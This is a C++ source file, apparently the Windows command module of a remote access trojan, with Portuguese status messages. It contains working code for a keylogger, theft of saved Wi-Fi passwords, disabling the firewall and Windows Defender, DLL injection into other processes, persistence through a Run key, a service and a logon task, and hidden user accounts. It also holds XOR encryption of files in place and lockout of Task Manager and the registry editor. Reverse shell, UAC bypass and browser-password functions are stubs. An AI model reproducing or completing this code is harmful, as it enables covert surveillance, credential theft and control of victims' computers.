std::string writeFileBase64(const std::string& path, const std::string& base64Data) {
    std::string decoded = base64Decode(base64Data);
    
    std::ofstream file(path, std::ios::binary);
    if (!file) return "Falha ao criar arquivo.";
    
    file.write(decoded.c_str(), decoded.size());
    file.close();
    
    return "Arquivo escrito: " + path;
}

std::string deleteFile(const std::string& path) {
    return DeleteFileA(path.c_str()) ? "Arquivo deletado." : "Falha ao deletar arquivo.";
}

std::string createDirectory(const std::string& path) {
    return CreateDirectoryA(path.c_str(), nullptr) ? "Diretório criado." : "Falha ao criar diretório.";
}

std::string moveFile(const std::string& srcPath, const std::string& dstPath) {
    return MoveFileA(srcPath.c_str(), dstPath.c_str()) ? "Arquivo movido." : "Falha ao mover arquivo.";
}

std::string copyFile(const std::string& srcPath, const std::string& dstPath) {
    return CopyFileA(srcPath.c_str(), dstPath.c_str(), FALSE) ? "Arquivo copiado." : "Falha ao copiar arquivo.";
}

std::string searchFiles(const std::string& rootPath, const std::string& pattern) {
    return "{\"error\":\"Feature disabled due to compiler limitations\"}";
}

std::string getRecentFilesJson() {
    char recentPath[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_RECENT, nullptr, 0, recentPath))) {
        return listDirectoryJson(recentPath);
    }
    return "[]";
}

std::string getBrowserHistoryJson() {
    return "{\"info\":\"Browser history extraction requires browser-specific implementations\"}";
}

std::string getBrowserPasswordsJson() {
    return "{\"info\":\"Password extraction requires browser-specific implementations and encryption handling\"}";
}

std::string getWifiPasswordsJson() {
    std::string output = execCommand("netsh wlan show profiles");
    std::ostringstream jsonOut;
    jsonOut << "[";
    bool first = true;
    
    size_t pos = 0;
    while ((pos = output.find("All User Profile", pos)) != std::string::npos) {
        pos += 17;
        while (pos < output.size() && output[pos] == ' ') pos++;
        if (pos >= output.size() || output[pos] != ':') continue;
        pos++;
        while (pos < output.size() && output[pos] == ' ') pos++;
        
        size_t endPos = output.find('\n', pos);
        if (endPos == std::string::npos) break;
        
        std::string ssid = output.substr(pos, endPos - pos);
        if (!ssid.empty() && ssid.back() == '\r') ssid.pop_back();
        
        std::string keyCmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear";
        std::string keyOutput = execCommand(keyCmd);
        
        std::string password = "N/A";
        size_t keyPos = keyOutput.find("Key Content");
        if (keyPos != std::string::npos) {
            keyPos = keyOutput.find(':', keyPos);
            if (keyPos != std::string::npos) {
                keyPos++;
                while (keyPos < keyOutput.size() && keyOutput[keyPos] == ' ') keyPos++;
                size_t keyEnd = keyOutput.find('\n', keyPos);
                if (keyEnd != std::string::npos) {
                    password = keyOutput.substr(keyPos, keyEnd - keyPos);
                    if (!password.empty() && password.back() == '\r') password.pop_back();
                }
            }
        }
        
        if (!first) jsonOut << ",";
        first = false;
        jsonOut << "{\"ssid\":\"" << jsonEscape(ssid) << "\",\"password\":\"" << jsonEscape(password) << "\"}";
        
        pos = endPos;
    }
    
    jsonOut << "]";
    return jsonOut.str();
}

std::string getActiveWindowInfo() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "{\"title\":\"\",\"process\":\"\"}";
    
    char title[512] = {};
    GetWindowTextA(hwnd, title, sizeof(title));
    
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    
    char processName[MAX_PATH] = {};
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProc) {
        DWORD len = sizeof(processName);
        QueryFullProcessImageNameA(hProc, 0, processName, &len);
        CloseHandle(hProc);
    }
    
    std::ostringstream jsonOut;
    jsonOut << "{"
            << "\"title\":\"" << jsonEscape(title) << "\","
            << "\"process\":\"" << jsonEscape(processName) << "\","
            << "\"pid\":" << pid
            << "}";
    return jsonOut.str();
}

std::string keyloggerStart() {
    if (g_keylogActive) return "Keylogger já está ativo.";
    
    g_keylogActive = true;
    g_keylogData.clear();
    
    g_keylogThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD {
        while (g_keylogActive) {
            for (int key = 8; key <= 190; key++) {
                if (GetAsyncKeyState(key) & 0x0001) {
                    char keyStr[32] = {};
                    if (key == VK_RETURN) strcpy_s(keyStr, "[ENTER]");
                    else if (key == VK_BACK) strcpy_s(keyStr, "[BACK]");
                    else if (key == VK_TAB) strcpy_s(keyStr, "[TAB]");
                    else if (key == VK_SPACE) strcpy_s(keyStr, " ");
                    else if (key == VK_SHIFT) strcpy_s(keyStr, "[SHIFT]");
                    else if (key == VK_CONTROL) strcpy_s(keyStr, "[CTRL]");
                    else if (key == VK_MENU) strcpy_s(keyStr, "[ALT]");
                    else {
                        BYTE keyState[256] = {};
                        GetKeyboardState(keyState);
                        WORD ascii = 0;
                        if (ToAscii(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyState, &ascii, 0) == 1) {
                            keyStr[0] = static_cast<char>(ascii);
                            keyStr[1] = '\0';
                        }
                    }
                    
                    if (keyStr[0] != '\0') {
                        g_keylogData += keyStr;
                    }
                }
            }
            Sleep(10);
        }
        return 0;
    }, NULL, 0, NULL);
    
    return "Keylogger iniciado.";
}

std::string keyloggerStop() {
    if (!g_keylogActive) return "Keylogger não está ativo.";
    
    g_keylogActive = false;
    if (g_keylogThread) {
        WaitForSingleObject(g_keylogThread, 5000);
        CloseHandle(g_keylogThread);
        g_keylogThread = NULL;
    }
    
    return "Keylogger parado.";
}

std::string keyloggerGetLogs() {
    return "{\"data\":\"" + jsonEscape(g_keylogData) + "\"}";
}

std::string webcamCapture() {
    return "{\"error\":\"Webcam capture requires DirectShow or Media Foundation implementation\"}";
}

std::string audioRecordStart(int durationSec) {
    return "{\"error\":\"Audio recording requires Windows Audio Session API implementation\"}";
}

std::string audioRecordStop() {
    return "{\"error\":\"Audio recording requires Windows Audio Session API implementation\"}";
}

std::string getServicesJson() {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) return "[]";
    
    DWORD bytesNeeded = 0;
    DWORD servicesReturned = 0;
    DWORD resumeHandle = 0;
    
    EnumServicesStatusA(scm, SERVICE_WIN32, SERVICE_STATE_ALL, nullptr, 0, &bytesNeeded, &servicesReturned, &resumeHandle);
    
    std::vector<BYTE> buffer(bytesNeeded);
    ENUM_SERVICE_STATUSA* services = reinterpret_cast<ENUM_SERVICE_STATUSA*>(buffer.data());
    
    if (!EnumServicesStatusA(scm, SERVICE_WIN32, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle)) {
        CloseServiceHandle(scm);
        return "[]";
    }
    
    std::ostringstream jsonOut;
    jsonOut << "[";
    for (DWORD i = 0; i < servicesReturned; i++) {
        if (i > 0) jsonOut << ",";
        
        const char* state = "Unknown";
        if (services[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING) state = "Running";
        else if (services[i].ServiceStatus.dwCurrentState == SERVICE_STOPPED) state = "Stopped";
        else if (services[i].ServiceStatus.dwCurrentState == SERVICE_PAUSED) state = "Paused";
        
        jsonOut << "{"
                << "\"name\":\"" << jsonEscape(services[i].lpServiceName) << "\","
                << "\"display\":\"" << jsonEscape(services[i].lpDisplayName) << "\","
                << "\"state\":\"" << state << "\""
                << "}";
    }
    jsonOut << "]";
    
    CloseServiceHandle(scm);
    return jsonOut.str();
}

std::string startService(const std::string& serviceName) {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return "Falha ao abrir SCM.";
    
    SC_HANDLE service = OpenServiceA(scm, serviceName.c_str(), SERVICE_START);
    if (!service) {
        CloseServiceHandle(scm);
        return "Falha ao abrir serviço.";
    }
    
    BOOL result = StartServiceA(service, 0, nullptr);
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    
    return result ? "Serviço iniciado." : "Falha ao iniciar serviço.";
}

std::string stopService(const std::string& serviceName) {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return "Falha ao abrir SCM.";
    
    SC_HANDLE service = OpenServiceA(scm, serviceName.c_str(), SERVICE_STOP);
    if (!service) {
        CloseServiceHandle(scm);
        return "Falha ao abrir serviço.";
    }
    
    SERVICE_STATUS status;
    BOOL result = ControlService(service, SERVICE_CONTROL_STOP, &status);
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    
    return result ? "Serviço parado." : "Falha ao parar serviço.";
}

std::string registryRead(const std::string& keyPath, const std::string& valueName) {
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            return "{\"error\":\"Falha ao abrir chave do registro\"}";
        }
    }
    
    char data[4096] = {};
    DWORD dataLen = sizeof(data);
    DWORD type = 0;
    
    LONG result = RegQueryValueExA(hKey, valueName.c_str(), nullptr, &type, reinterpret_cast<LPBYTE>(data), &dataLen);
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) return "{\"error\":\"Valor não encontrado\"}";
    
    return "{\"value\":\"" + jsonEscape(data) + "\"}";
}

std::string registryWrite(const std::string& keyPath, const std::string& valueName, const std::string& value) {
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr) != ERROR_SUCCESS) {
            return "Falha ao abrir/criar chave do registro.";
        }
    }
    
    LONG result = RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(value.c_str()), value.size() + 1);
    RegCloseKey(hKey);
    
    return result == ERROR_SUCCESS ? "Valor escrito no registro." : "Falha ao escrever no registro.";
}

std::string registryDelete(const std::string& keyPath, const std::string& valueName) {
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
            return "Falha ao abrir chave do registro.";
        }
    }
    
    LONG result = RegDeleteValueA(hKey, valueName.c_str());
    RegCloseKey(hKey);
    
    return result == ERROR_SUCCESS ? "Valor deletado do registro." : "Falha ao deletar valor.";
}

std::string getEnvironmentVarsJson() {
    char* env = GetEnvironmentStringsA();
    if (!env) return "[]";
    
    std::ostringstream jsonOut;
    jsonOut << "{";
    bool first = true;
    
    for (char* var = env; *var; var += strlen(var) + 1) {
        std::string entry(var);
        size_t eqPos = entry.find('=');
        if (eqPos != std::string::npos && eqPos > 0) {
            std::string name = entry.substr(0, eqPos);
            std::string value = entry.substr(eqPos + 1);
            
            if (!first) jsonOut << ",";
            first = false;
            jsonOut << "\"" << jsonEscape(name) << "\":\"" << jsonEscape(value) << "\"";
        }
    }
    
    FreeEnvironmentStringsA(env);
    jsonOut << "}";
    return jsonOut.str();
}

std::string setEnvironmentVar(const std::string& name, const std::string& value) {
    return SetEnvironmentVariableA(name.c_str(), value.c_str()) ? "Variável definida." : "Falha ao definir variável.";
}

std::string scheduleTask(const std::string& taskName, const std::string& command, const std::string& trigger) {
    std::string schedCmd = "schtasks /create /tn \"" + taskName + "\" /tr \"" + command + "\" /sc " + trigger + " /f";
    return execCommand(schedCmd);
}

std::string deleteTask(const std::string& taskName) {
    std::string delCmd = "schtasks /delete /tn \"" + taskName + "\" /f";
    return execCommand(delCmd);
}

std::string getTasksJson() {
    std::string output = execCommand("schtasks /query /fo csv /v");
    return "{\"csv\":\"" + jsonEscape(output) + "\"}";
}

std::string lockWorkstation() {
    return LockWorkStation() ? "Estação bloqueada." : "Falha ao bloquear.";
}

std::string logoffUser() {
    return ExitWindowsEx(EWX_LOGOFF, SHTDN_REASON_MAJOR_OTHER) ? "Logout iniciado." : "Falha no logout.";
}

std::string shutdownSystem(int delay) {
    std::string cmd = "shutdown /s /t " + std::to_string(delay);
    return execCommand(cmd);
}

std::string rebootSystem(int delay) {
    std::string cmd = "shutdown /r /t " + std::to_string(delay);
    return execCommand(cmd);
}

std::string getCurrentUserJson() {
    char username[256] = {};
    DWORD unLen = sizeof(username);
    GetUserNameA(username, &unLen);
    
    return "{\"username\":\"" + jsonEscape(username) + "\"}";
}

std::string getUsersJson() {
    std::string output = execCommand("net user");
    return "{\"output\":\"" + jsonEscape(output) + "\"}";
}

std::string addUser(const std::string& username, const std::string& password) {
    std::string cmd = "net user " + username + " " + password + " /add";
    return execCommand(cmd);
}

std::string deleteUser(const std::string& username) {
    std::string cmd = "net user " + username + " /delete";
    return execCommand(cmd);
}

std::string changePassword(const std::string& username, const std::string& newPassword) {
    std::string cmd = "net user " + username + " " + newPassword;
    return execCommand(cmd);
}

std::string getFirewallRulesJson() {
    std::string output = execCommand("netsh advfirewall firewall show rule name=all");
    return "{\"output\":\"" + jsonEscape(output) + "\"}";
}

std::string addFirewallRule(const std::string& ruleName, const std::string& program, const std::string& action) {
    std::string cmd = "netsh advfirewall firewall add rule name=\"" + ruleName + "\" dir=in action=" + action + " program=\"" + program + "\"";
    return execCommand(cmd);
}

std::string deleteFirewallRule(const std::string& ruleName) {
    std::string cmd = "netsh advfirewall firewall delete rule name=\"" + ruleName + "\"";
    return execCommand(cmd);
}

std::string disableFirewall() {
    return execCommand("netsh advfirewall set allprofiles state off");
}

std::string enableFirewall() {
    return execCommand("netsh advfirewall set allprofiles state on");
}

std::string disableWindowsDefender() {
    return execCommand("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true");
}

std::string enableWindowsDefender() {
    return execCommand("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $false");
}

std::string getAntivirusStatusJson() {
    std::string output = execCommand("powershell -Command Get-MpComputerStatus | ConvertTo-Json");
    return output;
}

std::string getPortsJson() {
    std::string output = execCommand("netstat -ano");
    return "{\"output\":\"" + jsonEscape(output) + "\"}";
}

std::string getConnectionsJson() {
    std::string output = execCommand("netstat -ano");
    return "{\"output\":\"" + jsonEscape(output) + "\"}";
}

std::string reverseShell(const std::string& host, int port) {
    return "{\"info\":\"Reverse shell requires socket implementation\"}";
}

std::string bindShell(int port) {
    return "{\"info\":\"Bind shell requires socket server implementation\"}";
}

std::string executeInMemory(const std::string& base64PE) {
    return "{\"info\":\"PE execution requires process hollowing or reflective loading\"}";
}

std::string injectDLL(DWORD pid, const std::string& dllPath) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return "Falha ao abrir processo.";
    
    size_t pathLen = dllPath.size() + 1;
    LPVOID pRemoteBuf = VirtualAllocEx(hProc, nullptr, pathLen, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteBuf) {
        CloseHandle(hProc);
        return "Falha ao alocar memória remota.";
    }
    
    WriteProcessMemory(hProc, pRemoteBuf, dllPath.c_str(), pathLen, nullptr);
    
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibrary = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryA"));
    
    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, pLoadLibrary, pRemoteBuf, 0, nullptr);
    if (!hThread) {
        VirtualFreeEx(hProc, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return "Falha ao criar thread remota.";
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProc);
    
    return "DLL injetada.";
}

std::string persistenceAddStartup(const std::string& name, const std::string& path) {
    return registryWrite("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, path);
}

std::string persistenceAddService(const std::string& serviceName, const std::string& binaryPath) {
    std::string cmd = "sc create \"" + serviceName + "\" binPath= \"" + binaryPath + "\" start= auto";
    return execCommand(cmd);
}

std::string persistenceAddScheduledTask(const std::string& taskName, const std::string& command) {
    return scheduleTask(taskName, command, "onlogon");
}

std::string elevatePrivileges() {
    return "{\"info\":\"Privilege escalation requires exploit implementation\"}";
}

std::string bypassUAC(const std::string& command) {
    return "{\"info\":\"UAC bypass requires specific Windows vulnerability exploitation\"}";
}

std::string disableTaskManager() {
    return registryWrite("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "1");
}

std::string enableTaskManager() {
    return registryDelete("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr");
}

std::string disableRegistryEditor() {
    return registryWrite("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", "1");
}

std::string enableRegistryEditor() {
    return registryDelete("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools");
}

std::string hideFile(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) return "Arquivo não encontrado.";
    return SetFileAttributesA(path.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN) ? "Arquivo ocultado." : "Falha ao ocultar.";
}

std::string unhideFile(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) return "Arquivo não encontrado.";
    return SetFileAttributesA(path.c_str(), attrs & ~FILE_ATTRIBUTE_HIDDEN) ? "Arquivo visível." : "Falha ao tornar visível.";
}

std::string encryptFile(const std::string& path, const std::string& key) {
    std::ifstream inFile(path, std::ios::binary);
    if (!inFile) return "Falha ao abrir arquivo.";
    
    std::vector<char> data((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();
    
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key[i % key.size()];
    }
    
    std::ofstream outFile(path, std::ios::binary);
    if (!outFile) return "Falha ao escrever arquivo.";
    outFile.write(data.data(), data.size());
    outFile.close();
    
    return "Arquivo criptografado.";
}

std::string decryptFile(const std::string& path, const std::string& key) {
    return encryptFile(path, key);
}

